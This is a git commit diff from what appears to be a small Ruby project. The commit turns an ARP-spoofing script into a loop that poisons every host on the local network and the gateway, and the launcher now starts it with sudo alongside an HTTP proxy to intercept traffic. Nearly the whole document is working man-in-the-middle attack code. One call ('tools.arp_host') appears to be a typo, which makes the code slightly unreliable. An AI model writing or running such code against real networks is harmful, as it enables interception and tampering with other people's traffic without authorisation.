e1ec4537d90030e32ff3f0172d43ec7e46df3a70
Carter Hay <clccmh@gmail.com>
2016-11-12 20:02:27 -0600

    should have working poison of network

--- bin/proxy.sh
+++ bin/proxy.sh
@@ -1,3 +1,4 @@
 #!/bin/bash
+sudo ruby ../lib/arp_spoof.rb $1 &
 ruby ../lib/http_proxy.rb 8000
 
--- lib/arp_spoof.rb
+++ lib/arp_spoof.rb
@@ -53,54 +53,37 @@ puts "Gateway IP: #{tools.gateway.ip_addr}"
 puts 'ARP IPs'
 tools.arp_hosts.each {|x| puts "IP: #{x.ip_addr}\tOUI: #{x.oui}"}
 
+threads = []
 
 puts "Sending ARP Packet Spoof Every 30 Seconds…"
-#tools.arp_hosts.each do |host|
-#  x = PacketFu::ARPPacket.new(ﬂavor: "Linux") # Flavor can be changed to Windows or hp_deskjet
-#  x.eth_saddr=tools.my_mac # Set your MAC Address
-#  x.eth_daddr=host.mac # Set victim MAC Address
-#  x.arp_saddr_mac=tools.my_mac # Set your MAC Address
-#  x.arp_daddr_mac=host.mac # Set victim MAC Address
-#  x.arp_saddr_ip=tools.gateway # Router IP Address
-#  x.arp_daddr_ip=host.ip_addr # Victim IP Address
-#  x.arp_opcode=2 # ARP Reply Code 
-#  sunny=false # Condition Set
-#  #while sunny==false do # Infinite Loop created
-#    x.to_w(ARGV[0]) # Put Packet to wire – Can change to eth0
-#    #sleep(30) # “Sleep” interval in seconds, change for your preference
-#  #end
-#end
-
-host = tools.arp_hosts.select {|x| x.ip_addr.include? ARGV[1]}
-host = host[0]
-puts host
-
-# Build Ethernet header
-arp_packet_victim = PacketFu::ARPPacket.new
-arp_packet_victim.eth_saddr = tools.my_mac              # our MAC address
-arp_packet_victim.eth_daddr = host.mac       # the victim's MAC address
-# Build ARP Packet
-arp_packet_victim.arp_saddr_mac = tools.my_mac   # our MAC address
-arp_packet_victim.arp_daddr_mac = host.mac   # the victim's MAC address
-arp_packet_victim.arp_saddr_ip = tools.gateway.ip_addr          # the router's IP
-arp_packet_victim.arp_daddr_ip = host.ip_addr         # the victim's IP
-arp_packet_victim.arp_opcode = 2                        # arp code 2 == ARP reply
-
-# Build Ethernet header
-arp_packet_router = PacketFu::ARPPacket.new
-arp_packet_router.eth_saddr = tools.my_mac       # our MAC address
-arp_packet_router.eth_daddr = tools.gateway.mac       # the router's MAC address
-# Build ARP Packet
-arp_packet_router.arp_saddr_mac = tools.my_mac   # our MAC address
-arp_packet_router.arp_daddr_mac = tools.gateway.mac   # the router's MAC address
-arp_packet_router.arp_saddr_ip = host.ip_addr         # the victim's IP
-arp_packet_router.arp_daddr_ip = tools.gateway.ip_addr          # the router's IP
-arp_packet_router.arp_opcode = 2                        # arp code 2 == ARP reply
 
 while true
-  sleep 1
-  puts "[+] Sending ARP packet to victim: #{arp_packet_victim.arp_daddr_ip}"
-  arp_packet_victim.to_w(ARGV[0])
-  puts "[+] Sending ARP packet to router: #{arp_packet_router.arp_daddr_ip}"
-  arp_packet_router.to_w(ARGV[0])
+  tools.arp_host.each do |host|
+    # Build Ethernet header
+    arp_packet_victim = PacketFu::ARPPacket.new
+    arp_packet_victim.eth_saddr = tools.my_mac              # our MAC address
+    arp_packet_victim.eth_daddr = host.mac       # the victim's MAC address
+    # Build ARP Packet
+    arp_packet_victim.arp_saddr_mac = tools.my_mac   # our MAC address
+    arp_packet_victim.arp_daddr_mac = host.mac   # the victim's MAC address
+    arp_packet_victim.arp_saddr_ip = tools.gateway.ip_addr          # the router's IP
+    arp_packet_victim.arp_daddr_ip = host.ip_addr         # the victim's IP
+    arp_packet_victim.arp_opcode = 2                        # arp code 2 == ARP reply
+
+    # Build Ethernet header
+    arp_packet_router = PacketFu::ARPPacket.new
+    arp_packet_router.eth_saddr = tools.my_mac       # our MAC address
+    arp_packet_router.eth_daddr = tools.gateway.mac       # the router's MAC address
+    # Build ARP Packet
+    arp_packet_router.arp_saddr_mac = tools.my_mac   # our MAC address
+    arp_packet_router.arp_daddr_mac = tools.gateway.mac   # the router's MAC address
+    arp_packet_router.arp_saddr_ip = host.ip_addr         # the victim's IP
+    arp_packet_router.arp_daddr_ip = tools.gateway.ip_addr          # the router's IP
+    arp_packet_router.arp_opcode = 2                        # arp code 2 == ARP reply
+
+    puts "[+] Sending ARP packet to victim: #{arp_packet_victim.arp_daddr_ip}"
+    arp_packet_victim.to_w(ARGV[0])
+    puts "[+] Sending ARP packet to router: #{arp_packet_router.arp_daddr_ip}"
+    arp_packet_router.to_w(ARGV[0])
+  end
 end
